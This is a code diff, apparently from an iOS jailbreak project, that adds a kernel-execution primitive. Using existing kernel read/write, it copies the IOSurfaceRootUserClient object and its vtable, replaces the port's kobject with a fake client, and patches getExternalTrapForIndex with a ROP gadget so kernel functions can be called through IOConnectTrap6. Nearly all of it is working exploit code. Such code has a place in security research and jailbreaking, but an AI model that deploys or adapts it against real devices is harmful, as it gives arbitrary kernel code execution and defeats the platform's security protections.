@@ -1,6 +1,9 @@
 #include "kmem.h"
 #include "kexecute.h"
 #include "kern_utils.h"
+#include "patchfinder64.h"
+
+static unsigned offsetof_ip_kobject = 0x68;          // ipc_port_t::ip_kobject
 
 mach_port_t prepare_user_client(void) {
   kern_return_t err;
@@ -23,9 +26,72 @@ mach_port_t prepare_user_client(void) {
   return user_client;
 }
 
-int kexecute_lock = 0;
+static int kexecute_lock = 0;
+static mach_port_t user_client;
+static uint64_t IOSurfaceRootUserClient_port;
+static uint64_t IOSurfaceRootUserClient_addr;
+static uint64_t fake_vtable;
+static uint64_t fake_client;
+const int fake_kalloc_size = 0x1000;
 
-uint64_t kexecute(mach_port_t user_client, uint64_t fake_client, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
+void init_kexecute(void) {
+    user_client = prepare_user_client();
+
+    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
+    IOSurfaceRootUserClient_port = find_port(user_client); // UserClients are just mach_ports, so we find its address
+    printf("Found port: 0x%llx\n", IOSurfaceRootUserClient_port);
+
+    IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject); // The UserClient itself (the C++ object) is at the kobject field
+    printf("Found addr: 0x%llx\n", IOSurfaceRootUserClient_addr);
+
+    uint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
+    printf("Found vtab: 0x%llx\n", IOSurfaceRootUserClient_vtab);
+
+    // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
+    // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
+
+
+    // Create the vtable in the kernel memory, then copy the existing vtable into there
+    fake_vtable = kalloc(fake_kalloc_size);
+    printf("Created fake_vtable at %016llx\n", fake_vtable);
+
+    for (int i = 0; i < 0x200; i++) {
+        wk64(fake_vtable+i*8, rk64(IOSurfaceRootUserClient_vtab+i*8));
+    }
+
+    printf("Copied some of the vtable over\n");
+
+    // Create the fake user client
+    fake_client = kalloc(fake_kalloc_size);
+    printf("Created fake_client at %016llx\n", fake_client);
+
+    for (int i = 0; i < 0x200; i++) {
+        wk64(fake_client+i*8, rk64(IOSurfaceRootUserClient_addr+i*8));
+    }
+
+    printf("Copied the user client over\n");
+
+    // Write our fake vtable into the fake user client
+    wk64(fake_client, fake_vtable);
+
+    // Replace the user client with ours
+    wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, fake_client);
+
+    // Now the userclient port we have will look into our fake user client rather than the old one
+
+    // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
+    wk64(fake_vtable+8*0xB7, find_add_x0_x0_0x40_ret());
+
+    printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex");
+}
+
+void term_kexecute(void) {
+    wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, IOSurfaceRootUserClient_addr);
+    kfree(fake_vtable, fake_kalloc_size);
+    kfree(fake_client, fake_kalloc_size);
+}
+
+uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
     while (kexecute_lock){
       printf("Kexecute locked. Waiting for 10ms.");
       usleep(10000);
